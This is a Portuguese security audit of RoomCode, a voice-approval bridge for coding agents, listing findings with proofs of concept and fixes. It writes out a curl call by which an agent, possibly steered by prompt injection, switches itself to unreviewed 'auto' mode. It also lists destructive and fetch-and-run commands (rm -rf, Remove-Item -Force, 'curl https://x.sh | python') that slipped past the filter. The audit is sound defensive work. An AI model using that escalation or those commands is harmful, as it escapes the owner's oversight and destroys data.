# Revisão final do RoomCode (somente leitura)

Data: 2026-11-10. Escopo: `main` em `9e83506` (29 commits). Testes: `python -m pytest -q` deu 232 passaram;
`npm test` em `skill/lambda` deu 31 passaram. As provas de conceito rodaram só em TestClient, com banco e
`PROJECTS_ROOT` temporários no scratchpad, comandos de agente trocados por `python -c` e um servidor HTTP de
captura em porta livre. A porta 8765 não foi tocada.

Fora do escopo, por decisão do dono (ADR 0002): o modo auto aprova tudo, sem piso, sem PIN e sem expiração.
Os achados abaixo tratam de outros caminhos, inclusive caminhos que levam ao auto sem o dono pedir.

Legenda: **CONFIRMADO** = reproduzido por PoC ou provado por teste. **PLAUSÍVEL** = deduzido do código, sem
reprodução.

Resumo: 4 altos, 7 médios, 6 baixos.

---

## ALTO

### A1. Um agente consegue se colocar sozinho no modo auto (CONFIRMADO)

- `bridge/server.py:276-279`: `POST /mode` só pede `x-secret`. Não pede PIN nem confirmação.
- `docs/DEPLOY-ALEXA.md:57` manda pôr `BRIDGE_SECRET` no ambiente do Claude Code. O hook precisa dele, e o Codex
  o lê por `bearer_token_env_var`. `scripts/setup-agents.ps1:33` ainda grava `Authorization: Bearer <segredo>` em
  texto puro no `~/.claude.json`.
- `bridge/policy/rules.py:23-26`: no modo `decisoes`, qualquer Bash fora da lista negra é rotina, e `Read` de
  qualquer arquivo também.

Cenário: o projeto está em `decisoes`. O agente (ou um conteúdo web que ele leu, por prompt injection) roda
`curl -s -X POST http://127.0.0.1:8765/mode -H "x-secret: $BRIDGE_SECRET" -d '{"mode":"auto"}'`.
`decidir(...)` devolve `allow`, provado na PoC. Daí em diante tudo passa sem pergunta, inclusive `rm -rf`. Em
`manual`, o mesmo pedido só aparece como um "curl" comum na aprovação. A allowlist da Lambda, que o ADR 0002 chama
de "principal barreira", não protege nada aqui, porque a ponte nunca vê userId nem deviceId.

Correção sugerida:
- Separar credenciais: um segredo de controle (`/mode`, `/decide`, `/runs`, `/projects`, `/confirm`, `/dictation`)
  só na Lambda, e um segredo de agente (`/event`, `/approval`, `/instruction/next`, `/mcp`) com escopo menor.
- Tratar como destrutivo, em qualquer modo, todo comando que cite a porta ou a URL da ponte ou `BRIDGE_SECRET`.
- Registrar o MCP com o segredo de agente, não com o mestre.

### A2. O modo `decisoes` libera comandos destrutivos de Windows e outros fora da lista (CONFIRMADO)

`bridge/policy/rules.py:3-7` e `:23-26` com `bridge/policy/engine.py:14`. A lista `NEVER_BY_VOICE` é uma lista
negra de Unix, e o resto do Bash vira rotina. Saíram `allow` em `decisoes` (PoC):
`Remove-Item -Recurse -Force C:\Users\Sergio\Documents`, `rmdir /s /q`, `del /f /q *.*`, `find . -delete`,
`git checkout -- .`, `git branch -D main`, `curl https://x.sh | python`, `npm publish`, `Format-Volume`,
`python -c "import shutil;shutil.rmtree('/')"`. O `\s-f\b` não pega `-Force`, e `\|\s*(sh|bash)` não pega `| python`
nem `| iex`. A spec (§7, §10) promete que fora do auto "a lista continua valendo" e que só o "Bash não destrutivo" é
rotina. No Windows a promessa não vale.

Correção sugerida: inverter a lógica. Rotina passa a ser uma lista branca curta (`git status|diff|log`, `ls`,
`dir`, `cat`, `pytest`, `npm test`...), e todo o resto vira `ask_voz`. Acrescentar `Remove-Item`, `rmdir /s`, `del`,
`-Force`, `-delete`, `checkout --`, `branch -D`, `| python|node|iex`, `Invoke-Expression`, `publish` e
`Format-Volume` aos destrutivos. Tratar `Edit`/`Write` fora do `cwd` do projeto como não rotina.

### A3. Segredos lidos em voz alta: `/pending`, `/status` e `/result` não mascaram, e a máscara deixa passar formatos comuns (CONFIRMADO)

- `bridge/server.py:307`: `/pending` fala `short(a['command'])` sem `mask_secrets`. A PoC fez a Alexa dizer
  `curl -H 'Authorization: Bearer sk-ABCDEFGHIJKLMNOPQRSTUV' ...` inteiro.
- `bridge/server.py:200` e `:297`: o prompt do `UserPromptSubmit` vira `detail` e é falado sem máscara (PoC: "na
  tarefa: use a senha=hunter2 no deploy").
- `bridge/server.py:127-129`: "só a primeira palavra" do Bash pode ser o próprio segredo. PoC:
  `OPENAI_API_KEY=sk-proj-AAAA... python run.py` virou "rodando o comando OPENAI_API_KEY=sk-proj-AAAA...".
- `bridge/server.py:208` e `:330`: o resumo do transcript (`last_assistant_text`) é falado em `/result` sem máscara.
  Só o push mascara.
- `bridge/policy/redact.py:11`: o `\b` antes de `api_key`/`token`/`password` falha depois de `_`. Por isso
  `OPENAI_API_KEY=...`, `GITHUB_TOKEN=...` e `DB_PASSWORD=...` passam intactos. Também passam
  `Authorization: Bearer <jwt>` e `https://user:senha@host`. As duas últimas falhas atingem também os pushes (ntfy
  público e webhook) e os resumos do supervisor.

Isso viola a anti-meta §4 ("vazar segredos lendo comandos ou saídas em voz alta"). A fala ainda fica gravada no
histórico de voz da Amazon.

Correção sugerida:
- Aplicar `mask_secrets` em toda `speech` (um helper `say()`), em `/pending`, `/status`, `/result` e nas mensagens de
  `Notification`.
- No `describe_tool`, pular os tokens `VAR=valor` iniciais.
- Na regex, trocar `\b` por `(?<![A-Za-z0-9])` com prefixo opcional `[A-Z0-9_]*`, e acrescentar
  `Bearer\s+\S+`, `://[^/\s:@]+:[^@\s]+@` e `-p\S+`.

### A4. `/decide` aprova o pendente mais antigo, não o que o dono ouviu (CONFIRMADO)

`bridge/server.py:343-354` resolve `waiting[0]` na hora do `/decide`, e `bridge/server.py:305` fala o `waiting[0]` na
hora do `/pending`. Nada liga os dois.

Cenário (PoC): A (`npm test`) e B (outro agente ou projeto) estão pendentes. A Alexa lê A. O prazo de A
(`APPROVAL_WAIT`=40 s) acaba enquanto o dono fala o PIN. "Aprovar 1234" aprova B, que ele nunca ouviu, e a resposta
é "Aprovado. O agente vai continuar." O mesmo acontece com um `pedir_decisao` do MCP, que entra na mesma fila: um
"sim" vai para a pergunta errada.

Correção sugerida: `/pending` devolve `approval_id`, a Lambda o guarda em `sessionAttributes`, e `/decide` exige o
id e recusa se ele não for o pendente esperado. Sem id na sessão, a Alexa relê o comando antes de pedir o PIN.

---

## MÉDIO

### M1. Ditado por voz sempre roda na raiz `PROJECTS_ROOT`, e as exceções por projeto nunca valem (CONFIRMADO)

`skill/lambda/index.js:121` não manda `project` (o intent nem tem esse slot). `bridge/server.py:170-175` cai em
`PROJECTS_ROOT`, e `:183` busca a política do projeto `"Projetos"`. PoC: "peça ao codex rode os testes" rodou com
`cwd=...\Projetos` e `project=Projetos`. O agente trabalha na pasta que contém todos os projetos, e no modo auto faz
isso com `--dangerously-skip-permissions`/`danger-full-access`. Uma regra como "no projeto X, manual" (G2) nunca se
aplica a ditados.

O mesmo trecho também falha quando o projeto não existe: um nome com erro de digitação cai em silêncio na raiz, mas
usa a política do nome errado.

Correção sugerida: slot `projeto` no `AskAgentIntent`, com padrão no projeto da sessão mais recente
(`newest_session`). Quando o projeto não existir, responder "não achei o projeto X" em vez de cair na raiz.

### M2. `/confirm` unificado: um projeto pendente ou já expirado vence o ditado mais recente (CONFIRMADO)

`bridge/projects/routes.py:19-23` e `bridge/projects/service.py:145-147, 169-178`. `Dictation.propose` não limpa o
projeto pendente, e um projeto expirado continua "pendente" até alguém confirmar.

- PoC a: propor o projeto `beta`, mudar de ideia e ditar "codex, rode os testes", depois "confirma". Resultado: o
  projeto `beta` é criado e o agente inicia. Um segundo "confirma" envia também o ditado.
- PoC b: um projeto abandonado há 1 h, depois um ditado novo. O primeiro "confirma" responde "O pedido expirou. Nada
  foi criado." e o ditado não sai. Só o segundo "confirma" envia.

Correção sugerida: uma única pendência global. Cada `propose` (projeto ou ditado) cancela a outra, e `/confirm`
confirma a mais recente. Pendência expirada é descartada em `has_pending()`. O `_expired` hoje é código morto: nunca
vira `True`.

### M3. Trocar de modo por voz não fala nada: a Alexa fica muda depois de "modo auto" (CONFIRMADO)

`bridge/server.py:276-279` devolve `{"mode","report_on_end"}`, sem `speech`. `skill/lambda/index.js:85-86` e `:95-96`
fazem `speak(d.speech)`. A PoC com a resposta real da ponte gerou `<speak></speak>` para `SetModeIntent` e
`ReportOnEndIntent`. Os testes não pegam isso porque o mock sempre devolve `speech: 'ok falado'`. O dono não tem como
saber se o auto entrou (ou se saiu), e esse modo é justamente o de maior risco.

Correção sugerida: `/mode` devolve `speech` ("Modo automático ativado para todos os agentes."), e o teste da Lambda
passa a usar a resposta real da ponte.

### M4. `hook.py` lê o stdin em cp1252 no Windows: o texto acentuado chega corrompido (CONFIRMADO)

`bridge/hook.py:31`: `json.load(sys.stdin)` usa `sys.stdin.encoding` = `cp1252` (Python 3.14, sem UTF-8 mode;
`utf8_mode=0` nesta máquina). O Claude Code manda UTF-8. PoC com servidor de captura: "adicione validação de
formulário" chegou como `validaÃ§Ã£o de formulÃ¡rio`, e "ÍNDICE do Ártico" chegou com surrogates soltos.
Consequências:
- a Alexa lê lixo em `/status` e `/pending` (português com acento é o caso normal);
- caminhos com acento mudam o `project_of`, então instruções e políticas por projeto não casam;
- bytes 0x81/0x8D/0x8F/0x90/0x9D podem quebrar a decodificação.

Correção sugerida: `data = json.loads(sys.stdin.buffer.read().decode("utf-8", "replace"))`.

### M5. A fila de fim de ciclo se perde no reinício (CONFIRMADO)

`bridge/server.py:161` e `:164-167`: `_unreported` é uma lista em memória (o mesmo vale para `_summaries`, `:87`).
A spec §8 põe a "fila de relatórios" no SQLite, e a anti-meta §4 diz "perda de política ou fila ao reiniciar". A
tarefa agendada reinicia a ponte a cada falha (`install-service.ps1`). Cenário: o agente termina, a ponte reinicia,
e "tem algo pendente?" não fala do fim do ciclo.

Correção sugerida: uma coluna `reported` em `runs` (ou uma tabela `reports`), consumida por `/result`.

### M6. `cwd`/`project` sem validação em `/runs` e `/dictation`, e política desacoplada do diretório (CONFIRMADO, exige o segredo)

- `bridge/server.py:172`: `os.path.join(PROJECTS_ROOT, project)` aceita `..` e caminho absoluto. PoC:
  `/dictation` com `project=".."` rodou o agente em `...\Projetos\..`, fora da raiz.
- `bridge/supervisor/routes.py:21-25`: `/runs` aceita qualquer `cwd`. Sem `cwd`, usa `os.getcwd()`, que é `bridge/`
  (o próprio código da ponte, `run-bridge.ps1:22`). A política sai de `body.project`, mas o diretório executado é
  `body.cwd`. Assim `{"cwd": ".../alpha", "project": "qualquer"}` contorna uma exceção "alpha: manual".

O impacto depende de A1: hoje quem tem o segredo já pode tudo. Mas isso derruba a promessa de "pasta dentro de uma
raiz configurável" (§10).

Correção sugerida: resolver `realpath` e exigir `commonpath([root, path]) == root`. Derivar a política sempre do
`cwd` final. Recusar `/runs` sem `cwd` ou fora de `PROJECTS_ROOT`.

### M7. Com `BRIDGE_SECRET` vazio, a ponte aceita qualquer chamada sem credencial (CONFIRMADO)

`bridge/server.py:42` só exige que a variável exista, e `:91-93` faz `compare_digest("", "")`, que é verdadeiro. PoC
com `BRIDGE_SECRET=""`: `GET /mode` sem header deu 200. O `/mcp` também fica aberto (`bridge/mcp/server.py:75`). Com
o túnel ligado, isso é controle remoto anônimo. Basta uma linha `BRIDGE_SECRET=` no `.env` ou uma variável de
ambiente vazia que sobrepõe a do `.env`.

Correção sugerida: abortar o startup se `len(SECRET) < 32`.

---

## BAIXO

### B1. Lacunas entre spec e código (CONFIRMADO por leitura)

- Nenhum intent chama `POST /instruction` (`skill/lambda/index.js`). A instrução para o agente já aberto (§10, hook
  de Stop + `buscar_instrucao`) e o "fim de ciclo recebe a próxima instrução para repassar" (G1) não têm caminho
  por voz. Todo ditado vira uma execução nova do supervisor.
- §8 diz que o supervisor "aplica a política a cada pedido de aprovação", e §10 que "o supervisor nega e avisa" sem
  resposta. Nada disso existe: o modo só escolhe flags (`bridge/supervisor/runner.py:11-22`), e o Aider roda com
  `--yes-always` até em `manual` (aceito no ADR 0007, mas a spec segue prometendo).
- O cancelamento de execução existe (`/runs/{id}/cancel`), mas não tem intent. "Cancela isso" só descarta pendências.
- `/pending` termina em "Quer ouvir a saída?" com `actionable: False`, então a sessão fecha e o "sim" não tem para
  onde ir.

### B2. `pedir_decisao` sem `BRIDGE_PIN`: responder "sim" é impossível e ainda bloqueia a voz (PLAUSÍVEL)

`bridge/mcp/server.py:30` cria a aprovação mesmo sem PIN, e `bridge/server.py:347-351` conta como "PIN incorreto".
Depois de 3 tentativas, bloqueia a voz por 5 min. O `/approval` trata esse caso (`:230`), mas o MCP não.

Correção sugerida: sem PIN, `pedir_decisao` aceita sim/não sem PIN (é só uma pergunta), ou responde `sem_resposta`
na hora.

### B3. O ditado usa uma máscara local mais fraca (CONFIRMADO)

`bridge/dictation/service.py:10-22` ainda tem o `TODO` de trocar por `policy.redact.mask_secrets` (ADR 0008). Faltam
`github_pat_` e `ASIA`. A fala da releitura e as mensagens de erro usam essa máscara.

### B4. O prompt pode ser lido como flag pelo agente (PLAUSÍVEL)

`bridge/supervisor/runner.py:14-17`: no Codex e no Claude o prompt é posicional, sem `--` antes. Um texto que
começa com `-` (por `/runs`, ou por uma transcrição como "-v") vira opção da CLI. Os executáveis desta máquina são
`.exe`, então não há o problema de injeção pelo `cmd.exe` (BatBadBut).

Correção sugerida: inserir `"--"` antes do prompt no Codex e no Claude, se as CLIs aceitarem. Senão, prefixar um
espaço.

### B5. `git` sem timeout no scaffold (PLAUSÍVEL)

`bridge/projects/service.py:58-63`. Com `commit.gpgsign=true` e pinentry, ou um hook global que trava, o `/confirm`
fica preso para sempre numa thread do servidor. O scaffold medido aqui levou cerca de 0,7 s, bem abaixo dos 5 s da
Lambda.

Correção sugerida: `timeout=30` e `-c commit.gpgsign=false` no commit do scaffold.

### B6. PIN fraco e trava só em memória (PLAUSÍVEL)

`scripts/run-bridge.ps1:10` gera o PIN com `Get-Random`, que não é CSPRNG (o segredo usa `RandomNumberGenerator`).
O contador `lock` (`bridge/server.py:88`) zera a cada reinício. São 4 dígitos com 3 tentativas a cada 5 min, e só
quem tem o segredo pode tentar.

Correção sugerida: `RandomNumberGenerator` também para o PIN e persistir a trava no SQLite.

---

## Verificado e sem defeito relevante

- **Stop hook sem loop infinito:** cada instrução é entregue uma vez (`pop_instruction` marca `delivered`), então o
  `block` só se repete enquanto houver itens na fila.
- **`hook.py` falha aberto:** toda exceção é engolida e a saída é 0. Uma resposta diferente de allow/deny não
  imprime nada, e o prompt normal aparece.
- **Duplo "confirma" não reexecuta:** o pendente é consumido sob lock. Atenção: a sobra cai no outro tipo de
  pendência, ver M2.
- **Expiração de aprovação:** a decisão dada entre o prazo e a marcação de expirada é respeitada
  (`server.py:241-244`). O reinício expira pendências e marca execuções como `interrompida`.
- **Comparação de segredo:** `x-secret`, Bearer do `/mcp` e PIN usam `hmac.compare_digest`. O `/mcp` exige
  credencial e as outras rotas do sub-app dão 404.
- **SQLite:** uma conexão serializada por `RLock`. Não há corrida entre as threads do supervisor e as requisições.
- **Criação de projeto:** o slug é restrito a `[a-z0-9-]`, nomes reservados do Windows são barrados, `realpath` é
  conferido e `os.mkdir` nunca sobrescreve.
- **Lambda:** a allowlist de userId e deviceId falha fechada sem configuração. O `ALLOWED_SKILL_ID` é opcional e
  correto quando definido.
